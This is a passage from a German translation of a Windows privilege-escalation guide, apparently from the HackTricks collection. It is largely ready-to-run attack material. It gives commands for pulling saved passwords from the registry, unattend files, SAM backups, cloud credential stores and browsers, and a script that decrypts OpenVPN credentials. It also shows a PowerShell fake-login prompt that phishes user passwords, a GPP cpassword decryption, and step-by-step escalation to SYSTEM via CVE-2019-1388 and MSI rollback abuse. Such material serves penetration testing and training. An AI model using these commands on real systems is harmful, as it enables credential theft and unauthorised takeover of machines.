# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Prüfe, ob `C:\Windows\CCM\SCClient.exe` existiert .\
Installer werden mit **SYSTEM-Rechten** ausgeführt, viele sind anfällig für **DLL Sideloading (Info von** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dateien und Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH-Keys in der Registry

SSH-Private Keys können im Registry-Schlüssel `HKCU\Software\OpenSSH\Agent\Keys` gespeichert werden, daher solltest du prüfen, ob sich dort etwas Interessantes befindet:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Wenn du in diesem Pfad einen Eintrag findest, ist es wahrscheinlich ein gespeicherter SSH-Key. Er ist verschlüsselt gespeichert, kann aber leicht mit [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) entschlüsselt werden.\
Mehr Informationen zu dieser Technik hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Wenn der `ssh-agent`-Dienst nicht läuft und du möchtest, dass er beim Booten automatisch startet, führe aus:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Es scheint, als wäre diese Technik nicht mehr gültig. Ich habe versucht, einige ssh keys zu erstellen, sie mit `ssh-add` hinzuzufügen und mich per ssh bei einer Maschine anzumelden. Der Registry-Schlüssel HKCU\Software\OpenSSH\Agent\Keys existiert nicht und procmon hat die Verwendung von `dpapi.dll` während der asymmetrischen Schlüssel-Authentifizierung nicht identifiziert.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Du kannst diese Dateien auch mit **metasploit** suchen: _post/windows/gather/enum_unattend_

Beispielinhalt:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM-Backups
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud-Anmeldedaten
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Suche nach einer Datei namens **SiteList.xml**

### Cached GPP Pasword

Eine Funktion war früher verfügbar, die das Bereitstellen von benutzerdefinierten lokalen Administrator-Konten auf einer Gruppe von Maschinen über Group Policy Preferences (GPP) erlaubte. Diese Methode hatte jedoch erhebliche Sicherheitsprobleme. Erstens konnten die Group Policy Objects (GPOs), die als XML-Dateien in SYSVOL gespeichert waren, von jedem Domain-User eingesehen werden. Zweitens konnten die Passwörter in diesen GPPs, die mit AES256 unter Verwendung eines öffentlich dokumentierten Default Key verschlüsselt waren, von jedem authentifizierten User entschlüsselt werden. Dies stellte ein ernstes Risiko dar, da es Benutzern ermöglichen konnte, erhöhte Privilegien zu erlangen.

Um dieses Risiko zu mindern, wurde eine Funktion entwickelt, die lokal gecachte GPP-Dateien mit einem nicht leeren "cpassword"-Feld scannt. Wird eine solche Datei gefunden, entschlüsselt die Funktion das Passwort und gibt ein benutzerdefiniertes PowerShell-Objekt zurück. Dieses Objekt enthält Details über das GPP und den Speicherort der Datei und hilft so bei der Identifizierung und Behebung dieser Sicherheitslücke.

Suche in `C:\ProgramData\Microsoft\Group Policy\history` oder in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (vor W Vista)_ nach diesen Dateien:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Um das cPassword zu entschlüsseln:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
CrackMapExec verwenden, um die Passwörter zu erhalten:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Beispiel von web.config mit Anmeldedaten:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN-Anmeldeinformationen
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Nach Zugangsdaten fragen

Du kannst immer **den Benutzer bitten, seine Zugangsdaten einzugeben, oder sogar die Zugangsdaten eines anderen Benutzers**, wenn du denkst, dass er sie kennen kann (beachte, dass das direkte **Bitten** des Clients um die **Zugangsdaten** wirklich **riskant** ist):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Mögliche Dateinamen, die Credentials enthalten**

Bekannte Dateien, die früher manchmal **Passwörter** im **Klartext** oder in **Base64** enthielten
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Bitte durchsuchen Sie alle vorgeschlagenen Dateien:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Anmeldeinformationen in der RecycleBin

Du solltest auch den Bin überprüfen, um darin nach Anmeldeinformationen zu suchen

Um von mehreren Programmen gespeicherte **Passwörter wiederherzustellen**, kannst du verwenden: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### In der Registry

**Andere mögliche Registry-Keys mit Anmeldeinformationen**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**openssh-Schlüssel aus der Registry extrahieren.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browser-Verlauf

Du solltest nach dbs suchen, in denen Passwörter von **Chrome oder Firefox** gespeichert sind.\
Prüfe auch den Verlauf, Lesezeichen und Favoriten der Browser, da dort vielleicht einige **Passwörter sind** gespeichert.

Tools zum Extrahieren von Passwörtern aus Browsern:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ist eine Technologie, die im Windows-Betriebssystem integriert ist und die **Interkommunikation** zwischen Softwarekomponenten verschiedener Sprachen ermöglicht. Jede COM-Komponente wird **über eine class ID (CLSID)** identifiziert und jede Komponente stellt Funktionalität über eine oder mehrere Schnittstellen bereit, die durch interface IDs (IIDs) identifiziert werden.

COM-Klassen und Schnittstellen sind in der Registry unter **HKEY\CLASSES\ROOT\CLSID** bzw. **HKEY\CLASSES\ROOT\Interface** definiert. Diese Registry wird durch das Zusammenführen von **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** erstellt.

Innerhalb der CLSIDs dieser Registry findest du die untergeordneten Registry-Einträge **InProcServer32**, die einen **default value** enthalten, der auf eine **DLL** verweist, sowie einen Wert namens **ThreadingModel**, der **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) oder **Neutral** (Thread Neutral) sein kann.

![Browsers History - COM DLL Overwriting: Inside the CLSIDs of this registry you can find the child registry InProcServer32 which contains a default value pointing to a DLL and a value...](<../../images/image (729).png>)

Im Grunde gilt: Wenn du **eine der DLLs überschreiben** kannst, die ausgeführt werden sollen, könntest du **Privilegien eskalieren**, wenn diese DLL von einem anderen Benutzer ausgeführt wird.

Um zu lernen, wie Angreifer COM Hijacking als Persistenzmechanismus nutzen, siehe:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generische Passwortsuche in Dateien und Registry**

**Nach Dateiinhalten suchen**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Suche nach einer Datei mit einem bestimmten Dateinamen**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Durchsuche die Registry nach Schlüsselnamen und Passwörtern**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Tools that search for passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ist ein msf**-Plugin, das ich erstellt habe. Es führt automatisch jedes Metasploit-POST-Modul aus, das auf dem Opfer nach credentials sucht.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sucht automatisch nach allen Dateien, die passwords enthalten und auf dieser Seite erwähnt werden.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ist ein weiteres großartiges Tool, um passwords aus einem System zu extrahieren.

Das Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) sucht nach **sessions**, **usernames** und **passwords** mehrerer Tools, die diese Daten im Klartext speichern (PuTTY, WinSCP, FileZilla, SuperPuTTY und RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Stell dir vor, **ein als SYSTEM laufender Prozess einen neuen Prozess öffnet** (`OpenProcess()`) **mit vollem Zugriff**. Derselbe Prozess **erstellt außerdem einen neuen Prozess** (`CreateProcess()`) **mit niedrigen Rechten, aber erbt alle offenen Handles des Hauptprozesses**.\
Wenn du dann **vollen Zugriff auf den niedrig privilegierten Prozess** hast, kannst du den **offenen Handle zum erstellten privilegierten Prozess** mit `OpenProcess()` abgreifen und **Shellcode injizieren**.\
[Lesen Sie dieses Beispiel für weitere Informationen darüber, **wie man diese Schwachstelle erkennt und ausnutzt**.](leaked-handle-exploitation.md)\
[Lesen Sie diesen **anderen Beitrag für eine vollständigere Erklärung, wie man mehr offene Handles von Prozessen und Threads testet und missbraucht, die mit unterschiedlichen Berechtigungsstufen vererbt wurden (nicht nur voller Zugriff)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Geteilte Speichersegmente, genannt **pipes**, ermöglichen Prozesskommunikation und Datentransfer.

Windows bietet eine Funktion namens **Named Pipes**, die es nicht zusammenhängenden Prozessen ermöglicht, Daten zu teilen, sogar über unterschiedliche Netzwerke. Das ähnelt einer Client/Server-Architektur, mit den Rollen **named pipe server** und **named pipe client**.

Wenn Daten über eine pipe von einem **client** gesendet werden, hat der **server**, der die pipe eingerichtet hat, die Möglichkeit, die **Identität** des **client** anzunehmen, sofern er die nötigen **SeImpersonate**-Rechte besitzt. Das Identifizieren eines **privilegierten Prozesses**, der über eine pipe kommuniziert, die du nachahmen kannst, bietet die Gelegenheit, **höhere Rechte zu erlangen**, indem du die Identität dieses Prozesses übernimmst, sobald er mit der von dir eingerichteten pipe interagiert. Anleitungen zur Durchführung eines solchen Angriffs findest du [**hier**](named-pipe-client-impersonation.md) und [**hier**](#from-high-integrity-to-system).

Außerdem ermöglicht das folgende Tool, **eine Named-Pipe-Kommunikation mit einem Tool wie burp abzufangen:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **und dieses Tool ermöglicht es, alle pipes aufzulisten und anzuzeigen, um privescs zu finden** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Der Telephony-Dienst (TapiSrv) im Server-Modus stellt `\\pipe\\tapsrv` (MS-TRP) bereit. Ein entfernter authentifizierter client kann den mailslot-basierten Async-Event-Pfad missbrauchen, um `ClientAttach` in einen beliebigen **4-Byte-Write** auf jede vorhandene Datei umzuwandeln, die für `NETWORK SERVICE` schreibbar ist, und dann Telephony-Administratorrechte zu erlangen und eine beliebige DLL als Dienst zu laden. Vollständiger Ablauf:

- `ClientAttach` mit `pszDomainUser` auf einen schreibbaren vorhandenen Pfad gesetzt → der Dienst öffnet ihn über `CreateFileW(..., OPEN_EXISTING)` und verwendet ihn für Async-Event-Writes.
- Jedes Event schreibt das angreifergesteuerte `InitContext` aus `Initialize` in dieses Handle. Registriere eine line app mit `LRegisterRequestRecipient` (`Req_Func 61`), löse `TRequestMakeCall` aus (`Req_Func 121`), hole es mit `GetAsyncEvents` (`Req_Func 0`) ab und unregistere/shut down dann, um deterministische Writes zu wiederholen.
- Füge dich selbst zu `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini` hinzu, verbinde dich erneut und rufe dann `GetUIDllName` mit einem beliebigen DLL-Pfad auf, um `TSPI_providerUIIdentify` als `NETWORK SERVICE` auszuführen.

Weitere Details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Sieh dir die Seite **[https://filesec.io/](https://filesec.io/)** an

### Protocol handler / ShellExecute abuse via Markdown renderers

Klickbare Markdown-Links, die an `ShellExecuteExW` weitergeleitet werden, können gefährliche URI-Handler (`file:`, `ms-appinstaller:` oder jedes registrierte schema) auslösen und attacker-controlled Dateien als aktueller user ausführen. Siehe:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Wenn man als Benutzer eine Shell erhält, kann es geplante Tasks oder andere Prozesse geben, die ausgeführt werden und **Credentials in der command line übergeben**. Das folgende Skript erfasst alle zwei Sekunden die command lines von Prozessen und vergleicht den aktuellen Zustand mit dem vorherigen, wobei alle Unterschiede ausgegeben werden.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Passwörter aus Prozessen stehlen

## Von Low Priv User zu NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Wenn du Zugriff auf die grafische Oberfläche hast (über Konsole oder RDP) und UAC aktiviert ist, ist es in einigen Versionen von Microsoft Windows möglich, ein Terminal oder einen anderen Prozess wie "NT\AUTHORITY SYSTEM" von einem unprivilegierten Benutzer aus auszuführen.

Dadurch ist es möglich, Privilegien zu eskalieren und UAC gleichzeitig mit derselben Schwachstelle zu umgehen. Außerdem ist es nicht nötig, irgendetwas zu installieren, und die während des Prozesses verwendete Binärdatei ist von Microsoft signiert und herausgegeben.

Einige der betroffenen Systeme sind die folgenden:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Um diese Schwachstelle auszunutzen, ist es notwendig, die folgenden Schritte auszuführen:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Von Administrator Medium zu High Integrity Level / UAC Bypass

Lies dies, um **über Integrity Levels zu lernen**:


{{#ref}}
integrity-levels.md
{{#endref}}

Dann **lies dies, um über UAC und UAC bypasses zu lernen:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Von Arbitrary Folder Delete/Move/Rename zu SYSTEM EoP

Die in [**diesem Blogpost**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) beschriebene Technik mit einem Exploit-Code [**hier verfügbar**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Der Angriff besteht im Wesentlichen darin, das Rollback-Feature von Windows Installer zu missbrauchen, um legitime Dateien während des Deinstallationsprozesses durch bösartige zu ersetzen. Dafür muss der Angreifer einen **malicious MSI installer** erstellen, der zum Hijacken des `C:\Config.Msi`-Ordners verwendet wird, der später von Windows Installer genutzt wird, um Rollback-Dateien während der Deinstallation anderer MSI-Pakete zu speichern, wobei die Rollback-Dateien so verändert werden, dass sie das bösartige Payload enthalten.

Die zusammengefasste Technik ist die folgende:

1. **Phase 1 – Vorbereitung auf den Hijack (`C:\Config.Msi` leer lassen)**

- Schritt 1: MSI installieren
- Erstelle eine `.msi`, die eine harmlose Datei (z. B. `dummy.txt`) in einem beschreibbaren Ordner (`TARGETDIR`) installiert.
- Markiere den Installer als **"UAC Compliant"**, damit ein **nicht-Admin-User** ihn ausführen kann.
- Halte danach einen **handle** auf die Datei offen.

- Schritt 2: Deinstallation starten
- Deinstalliere dieselbe `.msi`.
- Der Deinstallationsprozess beginnt, Dateien nach `C:\Config.Msi` zu verschieben und sie in `.rbf`-Dateien (Rollback-Backups) umzubenennen.
- **Poll den offenen Datei-Handle** mit `GetFinalPathNameByHandle`, um zu erkennen, wann die Datei zu `C:\Config.Msi\<random>.rbf` wird.

- Schritt 3: Custom Syncing
- Die `.msi` enthält eine **custom uninstall action (`SyncOnRbfWritten`)**, die:
- signalisiert, wenn `.rbf` geschrieben wurde.
- Dann **wartet** sie auf ein anderes Event, bevor die Deinstallation fortgesetzt wird.

- Schritt 4: Löschen der `.rbf` blockieren
- Wenn signalisiert wird, die `.rbf`-Datei ohne `FILE_SHARE_DELETE` öffnen — das **verhindert**, dass sie gelöscht werden kann.
- Dann **zurücksignalisieren**, damit die Deinstallation beendet werden kann.
- Windows Installer kann die `.rbf` nicht löschen, und weil nicht alle Inhalte gelöscht werden können, wird **`C:\Config.Msi` nicht entfernt**.

- Schritt 5: `.rbf` manuell löschen
- Du (Angreifer) löschst die `.rbf`-Datei manuell.
- Jetzt ist **`C:\Config.Msi` leer** und bereit für den Hijack.

> An diesem Punkt den **SYSTEM-level arbitrary folder delete vulnerability** auslösen, um `C:\Config.Msi` zu löschen.

2. **Phase 2 – Ersetzen von Rollback-Skripten durch bösartige**

- Schritt 6: `C:\Config.Msi` mit schwachen ACLs neu erstellen
- Erstelle den Ordner `C:\Config.Msi` selbst neu.
- Setze **schwache DACLs** (z. B. Everyone:F) und **halte einen handle offen** mit `WRITE_DAC`.

- Schritt 7: Einen weiteren Install ausführen
- Installiere die `.msi` erneut, mit:
- `TARGETDIR`: beschreibbarer Speicherort.
- `ERROROUT`: eine Variable, die einen erzwungenen Fehler auslöst.
- Dieser Install wird verwendet, um **rollback** erneut auszulösen, das `.rbs` und `.rbf` liest.

- Schritt 8: `.rbs` überwachen
- Verwende `ReadDirectoryChangesW`, um `C:\Config.Msi` zu überwachen, bis ein neues `.rbs` erscheint.
- Erfasse den Dateinamen.

- Schritt 9: Vor dem Rollback synchronisieren
- Die `.msi` enthält eine **custom install action (`SyncBeforeRollback`)**, die:
- ein Event signalisiert, wenn die `.rbs` erstellt wurde.
- Dann **wartet**, bevor sie fortfährt.

- Schritt 10: Schwache ACL erneut anwenden
- Nachdem das Event `.rbs created` empfangen wurde:
- Der Windows Installer **wendet starke ACLs erneut** auf `C:\Config.Msi` an.
- Aber da du weiterhin einen handle mit `WRITE_DAC` hast, kannst du **schwache ACLs erneut anwenden**.

> ACLs werden **nur beim Öffnen eines Handles** durchgesetzt, daher kannst du trotzdem in den Ordner schreiben.

- Schritt 11: Gefälschte `.rbs` und `.rbf` ablegen
- Überschreibe die `.rbs`-Datei mit einem **gefälschten Rollback-Skript**, das Windows anweist:
- deine `.rbf`-Datei (malicious DLL) in einen **privilegierten Speicherort** wiederherzustellen (z. B. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Lege deine gefälschte `.rbf` mit einer **malicious SYSTEM-level payload DLL** ab.

- Schritt 12: Rollback auslösen
- Signaliere das Sync-Event, damit der Installer fortfährt.
- Eine **type 19 custom action (`ErrorOut`)** ist so konfiguriert, dass der Install an einem bekannten Punkt **absichtlich fehlschlägt**.
- Dadurch beginnt der **rollback**.

- Schritt 13: SYSTEM installiert deine DLL
- Windows Installer:
- liest deine bösartige `.rbs`.
- kopiert deine `.rbf`-DLL in den Zielpfad.
- Du hast jetzt deine **malicious DLL in einem SYSTEM-loaded path**.

- Letzter Schritt: SYSTEM-Code ausführen
- Starte eine vertrauenswürdige **auto-elevated binary** (z. B. `osk.exe`), die die von dir gehijackte DLL lädt.
- **Boom**: Dein Code wird **als SYSTEM** ausgeführt.


### Von Arbitrary File Delete/Move/Rename zu SYSTEM EoP

Die zentrale MSI-Rollback-Technik (die vorherige) setzt voraus, dass du einen **ganzen Ordner** löschen kannst (z. B. `C:\Config.Msi`). Aber was, wenn deine Schwachstelle nur **arbitrary file deletion** erlaubt?

Du könntest die **NTFS internals** ausnutzen: Jeder Ordner hat einen versteckten Alternate Data Stream namens:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Dieser Stream speichert die **Index-Metadaten** des Ordners.

Wenn du also den **`::$INDEX_ALLOCATION`-Stream** eines Ordners **löschst**, **entfernt NTFS den gesamten Ordner** aus dem Dateisystem.

Du kannst dies mit standardmäßigen Datei-Lösch-APIs tun wie:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Obwohl du eine *file* delete API aufrufst, **löscht sie den Ordner selbst**.

### Von Folder Contents Delete zu SYSTEM EoP
Was, wenn dein Primitive es dir nicht erlaubt, beliebige Dateien/Ordner zu löschen, aber es **erlaubt das Löschen des *contents* eines vom Angreifer kontrollierten Ordners**?

1. Schritt 1: Bait-Ordner und Datei einrichten
- Erstellen: `C:\temp\folder1`
- Darin: `C:\temp\folder1\file1.txt`

2. Schritt 2: Einen **oplock** auf `file1.txt` setzen
- Der oplock **pausiert die Ausführung**, wenn ein privilegierter Prozess versucht, `file1.txt` zu löschen.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Schritt 3: SYSTEM-Prozess auslösen (z. B. `SilentCleanup`)
- Dieser Prozess scannt Ordner (z. B. `%TEMP%`) und versucht, deren Inhalte zu löschen.
- Wenn er `file1.txt` erreicht, **löst der oplock aus** und übergibt die Kontrolle an deinen Callback.

4. Schritt 4: Im oplock-Callback – die Löschung umleiten

- Option A: Verschiebe `file1.txt` an einen anderen Ort
- Dadurch wird `folder1` geleert, ohne den oplock zu brechen.
- Lösche `file1.txt` nicht direkt — das würde den oplock vorzeitig freigeben.

- Option B: Wandle `folder1` in eine **junction** um:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: Erstelle einen **Symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
